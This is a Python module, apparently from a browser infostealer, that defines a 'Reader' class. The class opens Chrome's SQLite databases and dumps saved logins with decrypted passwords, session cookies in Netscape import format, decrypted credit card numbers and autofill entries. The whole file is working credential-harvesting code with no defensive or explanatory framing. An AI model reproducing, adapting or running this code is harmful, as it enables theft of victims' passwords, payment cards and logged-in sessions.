#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author github.com/L1ghtM4n

__all__ = ["Reader"]

# Import modules
from io import BufferedReader
from re import compile as re_compile
# Import packages
from .sqlite import DatabaseConnection
from .decryptor import DecryptPassword

# Clean url from http, https, www
re_clean = re_compile(r"https?://(www\.)?")
def UrlClean(url: str) -> str:
    return re_clean.sub("", url).strip().strip("/")

""" Chrome reader object """
class Reader(object):
    def __init__(self, key: bytes):
        assert len(key) == 32, "Invalid encryption key"
        self.aes_key = key

    def DumpLogins(self, db: BufferedReader) -> list:
        credentials = []
        with DatabaseConnection(db, "LoginData") as sqlite:
            sqlite.cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for hostname, username, password in sqlite.cursor.fetchall():
                credentials.append({
                    "hostname": UrlClean(hostname),
                    "username": username,
                    "password": DecryptPassword(password, self.aes_key),
                })
        return credentials
    
    def DumpCookies(self, db: BufferedReader, netscape=False) -> list:
        cookies = []
        with DatabaseConnection(db, "Cookies") as sqlite:
            sqlite.cursor.execute("SELECT host_key, name, path, value, encrypted_value, expires_utc FROM cookies")
            for host, name, path, value, encrypted_value, expires in sqlite.cursor.fetchall():
                value = value if value else DecryptPassword(encrypted_value, self.aes_key)
                if not netscape:
                    cookies.append({
                        "host": host,
                        "name": name,
                        "path": path,
                        "value": value,
                        "expires": expires,
                    })
                else:
                    cookies.append(
                        "{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n"
                        .format(host, path, expires, name, value)
                        )
        return cookies

    def DumpCreditCards(self, db: BufferedReader) -> list:
        creditcards = []
        with DatabaseConnection(db, "CreditCards") as sqlite:
            sqlite.cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            for holder, month, year, number in sqlite.cursor.fetchall():
                creditcards.append({
                    "holder": holder if type(holder) == str else DecryptPassword(holder, self.aes_key),
                    "exp_month": month if type(month) == int else DecryptPassword(month, self.aes_key),
                    "exp_year": year if type(year) == int else DecryptPassword(year, self.aes_key),
                    "number": DecryptPassword(number, self.aes_key),
                })
        return creditcards

    def DumpAutoFill(self, db: BufferedReader) -> list:
        autofill = []
        with DatabaseConnection(db, "AutoFill") as sqlite:
            sqlite.cursor.execute("SELECT name, value FROM autofill")
            for name, value in sqlite.cursor.fetchall():
                autofill.append({
                    "name": name,
                    "value": value if type(value) == str else DecryptPassword(value, self.aes_key),
                })
        return autofill

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        del self
